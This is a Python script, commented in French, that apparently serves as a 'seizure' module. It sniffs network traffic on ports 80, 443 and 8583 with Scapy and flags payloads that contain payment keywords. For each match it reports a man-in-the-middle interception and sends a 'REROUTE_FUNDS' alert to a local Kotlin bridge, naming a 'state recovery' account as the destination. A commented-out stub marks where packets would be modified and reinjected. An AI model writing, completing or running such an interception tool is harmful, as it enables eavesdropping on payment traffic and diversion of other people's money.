import socket
import sys
import time
import json
from scapy.all import *

# Configuration de la cible et du compte de récupération
STATE_ACCOUNT = "CD-STATE-RECOVERY-778899"
BRIDGE_HOST = "127.0.0.1"
BRIDGE_PORT = 8888

def send_alert_to_bridge(message_dict):
    """
    Envoie une notification structurée au noyau Kotlin via le Socket 8888.
    """
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(2) # Évite de bloquer si le noyau Kotlin est éteint
        client.connect((BRIDGE_HOST, BRIDGE_PORT))
        
        # Sérialisation du message en JSON pour une meilleure lecture par Kotlin
        message_json = json.dumps(message_dict) + "\n"
        client.send(message_json.encode('utf-8'))
        client.close()
    except Exception as e:
        # En combat, on print les erreurs localement pour le débug
        print(f"[!] Erreur de liaison avec le Bridge : {e}")

def intercept_financial_traffic(packet):
    """
    Analyse le trafic réseau et applique la saisie conservatoire si nécessaire.
    """
    if packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Détection de mots-clés de protocoles financiers (ex: Mobile Money / ISO 8583)
            if "AMOUNT" in payload or "TRANSFER" in payload:
                target_found = "TARGET_REB_001" # Simule une détection d'ID suspect
                
                print(f"[MITM] Transaction détectée sur la cible {target_found}")
                
                # Préparation du rapport pour le noyau
                alert_data = {
                    "event": "FINANCIAL_INTERCEPTION",
                    "target": target_found,
                    "action": "REROUTE_FUNDS",
                    "destination_final": STATE_ACCOUNT,
                    "timestamp": time.time()
                }
                
                # Exécution de l'envoi vers Kotlin
                send_alert_to_bridge(alert_data)
                
                # Ici, on pourrait ajouter la logique Scapy pour modifier/réinjecter le paquet
                # send(IP(dst=packet[IP].dst)/TCP(...)/modified_payload)

        except Exception as e:
            pass

def main():
    print(f"📡 Module de Saisie Automatique actif (Redirection vers {STATE_ACCOUNT})")
    print(f"🔗 Liaison avec le noyau sur le port {BRIDGE_PORT}...")
    
    # Test de connexion au démarrage
    send_alert_to_bridge({"event": "SYSTEM_START", "module": "auto_seizure", "status": "READY"})
    
    # Lancement du sniffing (écoute) sur l'interface par défaut
    # Note : Nécessite des privilèges root/sudo pour Scapy
    try:
        sniff(filter="tcp port 80 or port 443 or port 8583", 
              prn=intercept_financial_traffic, 
              store=0)
    except KeyboardInterrupt:
        print("\n[!] Arrêt du module de saisie.")
        sys.exit(0)

if __name__ == "__main__":
    main()
